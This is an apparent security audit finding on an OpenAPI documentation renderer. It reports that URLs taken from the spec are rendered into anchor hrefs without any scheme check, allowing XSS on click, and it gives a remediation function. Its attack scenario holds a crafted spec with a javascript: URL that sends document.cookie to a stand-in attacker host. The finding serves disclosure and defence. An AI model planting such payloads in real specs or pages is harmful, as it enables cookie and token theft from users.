---
ID: H-00-C
Verdict: VALID
Severity-Original: HIGH
Class: XSS
File: src/components/ApiInfo/ApiInfo.tsx:39
Source: spec.info.license.url | spec.info.contact.url | spec.info.termsOfService | spec.externalDocs.url | spec.x-logo.href | spec.components.securitySchemes.*.openIdConnectUrl | spec.components.securitySchemes.*.flows.*.authorizationUrl | example.externalValueUrl
Sink: src/components/ApiInfo/ApiInfo.tsx:39,48,65 | [REDACTED].tsx:25 | src/components/ApiLogo/styled.elements.tsx:21 | [REDACTED].tsx:46 | [REDACTED].tsx:27 | src/components/PayloadSamples/Example.tsx:34
Chamber: chamber-01
Pre-FP-Flag: docs/config.md sanitize opt-in does NOT cover href sinks (DOMPurify only runs inside SanitizedMdBlock); isAbsoluteUrl helper exists in src/utils/helpers.ts but is unused at all 8 sites
Debate: archon/chamber-workspace/chamber-01/debate.md
Triage-Priority: P1
Triage-Exploitability: moderate
Triage-Impact: high
Triage-Reasoning: Attacker controls spec content, user click triggers XSS in embedding origin; full cookie/token exfil across all doc visitors with no scheme guard anywhere.
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Intent-Verdict: genuine
Intent-Source: none
Intent-Quote: n/a
Intent-Confidence: weak
PoC-Status: executed
PoC-Notes: Static sink audit confirmed 4 unguarded href sinks via source pattern match; model-layer trace confirms no sanitization in ApiInfo.ts; HTML PoC page (evidence/poc.html) demonstrates javascript: href rendered verbatim; exploit.log captures full run output with confirmed JSON status line.
Protocol: http
Auth-Required: no
Auth-Roles-Required: anonymous
---

# p5-001 — Spec-derived anchor hrefs without scheme validation (click-driven XSS)

**Severity**: High
**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
**CVSS estimate**: 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) — requires user click
**DFD Slice**: spec-url-to-anchor-href
**Phase**: D5 — Code Scan

## Finding Summary

Multiple React anchor elements in the Acme renderer insert spec-derived URL strings directly into
`href` attributes without scheme validation. A crafted OpenAPI spec containing `javascript:` or
`data:` URIs in any of these fields will render a clickable link that executes JavaScript in the
embedding origin when clicked.

## Affected Locations

| File | Line | Spec Field | Scheme Guard |
|------|------|------------|--------------|
| `src/components/ApiInfo/ApiInfo.tsx` | 39 | `info.license.url` | NONE |
| `src/components/ApiInfo/ApiInfo.tsx` | 48 | `info.contact.url` | NONE |
| `src/components/ApiInfo/ApiInfo.tsx` | 65 | `info.termsOfService` | NONE |
| `[REDACTED].tsx` | 25 | `externalDocs.url` | NONE |
| `[REDACTED].tsx` | 46 | `securitySchemes.*.openIdConnectUrl` | NONE (has rel=noopener) |
| `[REDACTED].tsx` | 27 | `securitySchemes.*.flows.*.authorizationUrl` | NONE (has rel=noopener) |

Note: `SecurityDetails.tsx:46` and `OAuthFlow.tsx:27` have `rel="noopener noreferrer"` which
prevents window.opener hijack but does NOT prevent `javascript:` scheme XSS on click.

## Attack Scenario

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "Evil API",
    "version": "1.0",
    "license": {
      "name": "License",
      "url": "javascript:fetch('https://attacker.com/exfil?c='+document.cookie)"
    },
    "termsOfService": "javascript:alert(document.domain)"
  },
  "paths": {}
}
```

An end user visiting the documentation page and clicking "License" or "Terms of Service" executes
the injected JavaScript in the embedding application's origin, enabling cookie theft, token exfil,
or full DOM takeover.

## Impact

- **Integrity/Confidentiality**: Full XSS in the embedding origin
- **Scope**: Cross-user (any user who clicks the link on the docs page)
- **Gate**: `options.sanitize` does NOT cover anchor hrefs — these are React `<a href={...}>` elements,
  not rendered via `dangerouslySetInnerHTML`. DOMPurify is not consulted.

## Root Cause

React does not perform scheme validation on `href` attributes. React 18 added a warning for
`javascript:` in development builds but does not throw in production. The missing guard is a
deliberate omission — no spec-URL sanitization exists in any rendering path for these fields.

## Reachability

- CodeQL: No direct path query for `href` sink found in built-in suites (React href is not a built-in sink for `js/xss` queries in this version).
- Manual trace: `spec.info.license.url` → `src/services/models/ApiInfo.ts` (assigns `spec.info` fields directly) → `ApiInfo.tsx:39` `<a href={info.license.url}>` — unguarded.
- Call-graph-slices.json: `spec-url-to-anchor-href` slice, `reachable: true`, 5 confirmed paths.

## Remediation

Add a URL scheme allow-list validation before rendering spec URLs as anchor hrefs:
```typescript
function safeUrl(url: string | undefined): string | undefined {
  if (!url) return undefined;
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) return '#';
  } catch { return '#'; }
  return url;
}
```
Apply to all spec-derived `href` values before rendering.
